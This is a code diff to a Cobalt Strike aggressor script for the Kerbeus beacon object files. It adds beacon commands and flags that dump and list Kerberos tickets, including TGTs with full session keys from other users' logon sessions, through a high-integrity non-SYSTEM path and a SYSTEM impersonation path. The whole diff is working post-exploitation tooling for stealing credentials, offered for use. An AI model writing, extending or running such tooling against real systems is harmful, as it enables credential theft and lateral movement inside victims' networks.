@@ -104,7 +104,9 @@ alias krb_describe {
 
 beacon_command_register("krb_dump", "Dump tickets",
 	"Dump tickets:\n\n" .
-	"    krb_dump [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]\n\n");
+	"    krb_dump [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT] [/high|/system]\n\n" .
+	"    /high   - dump TGTs from a high-integrity (non-SYSTEM) process via KerbRetrieveTicketMessage\n" .
+	"    /system - force the classic SYSTEM (SeTcbPrivilege) path\n\n");
 
 alias krb_dump {
 	$bid = $1;
@@ -117,6 +119,48 @@ alias krb_dump {
 	$arg_data  = bof_pack($bid, "z", $input);
 
 	blog($bid, "Kerbeus DUMP by RalfHacker");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+beacon_command_register("krb_dump_high", "Dump TGTs from a high-integrity process (no SYSTEM)",
+	"Dump TGTs from a high-integrity (non-SYSTEM) process:\n\n" .
+	"    krb_dump_high [/luid:LOGINID] [/user:USER]\n\n" .
+	"Uses KerbRetrieveTicketMessage to dump TGTs with full session keys for\n" .
+	"foreign logon sessions. Based on the klist-revisited technique.\n\n");
+
+alias krb_dump_high {
+	$bid = $1;
+    $input = substr($0, 15);
+
+	$handle = openf(script_resource("_bin/dump." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid, "z", "/high " . $input);
+
+	blog($bid, "Kerbeus DUMP (high integrity) by RalfHacker");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+beacon_command_register("krb_dump_system", "Dump TGTs via the SYSTEM (SeTcbPrivilege) path",
+	"Dump TGTs via the classic SYSTEM impersonation path:\n\n" .
+	"    krb_dump_system [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]\n\n");
+
+alias krb_dump_system {
+	$bid = $1;
+    $input = substr($0, 17);
+
+	$handle = openf(script_resource("_bin/dump." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid, "z", "/system " . $input);
+
+	blog($bid, "Kerbeus DUMP (system) by RalfHacker");
 	beacon_inline_execute($bid, $data, "go", $arg_data);
 }
 
@@ -165,7 +209,7 @@ alias krb_kerberoasting {
 
 beacon_command_register("krb_klist", "List tickets",
 	"List tickets:\n\n" .
-	"    krb_klist [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]\n\n");
+	"    krb_klist [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT] [/high|/system]\n\n");
 
 alias krb_klist {
 	$bid = $1;
@@ -178,6 +222,46 @@ alias krb_klist {
 	$arg_data  = bof_pack($bid, "z", $input);
 
 	blog($bid, "Kerbeus KLIST by RalfHacker");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+beacon_command_register("krb_klist_high", "List tickets from a high-integrity process (no SYSTEM)",
+	"List tickets from a high-integrity (non-SYSTEM) process:\n\n" .
+	"    krb_klist_high [/luid:LOGINID] [/user:USER]\n\n");
+
+alias krb_klist_high {
+	$bid = $1;
+    $input = substr($0, 16);
+
+	$handle = openf(script_resource("_bin/klist." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid, "z", "/high " . $input);
+
+	blog($bid, "Kerbeus KLIST (high integrity) by RalfHacker");
+	beacon_inline_execute($bid, $data, "go", $arg_data);
+}
+
+
+
+beacon_command_register("krb_klist_system", "List tickets via the SYSTEM (SeTcbPrivilege) path",
+	"List tickets via the classic SYSTEM impersonation path:\n\n" .
+	"    krb_klist_system [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]\n\n");
+
+alias krb_klist_system {
+	$bid = $1;
+    $input = substr($0, 18);
+
+	$handle = openf(script_resource("_bin/klist." . barch($bid) . ".o"));
+	$data   = readb($handle, -1);
+	closef($handle);
+
+	$arg_data  = bof_pack($bid, "z", "/system " . $input);
+
+	blog($bid, "Kerbeus KLIST (system) by RalfHacker");
 	beacon_inline_execute($bid, $data, "go", $arg_data);
 }
 
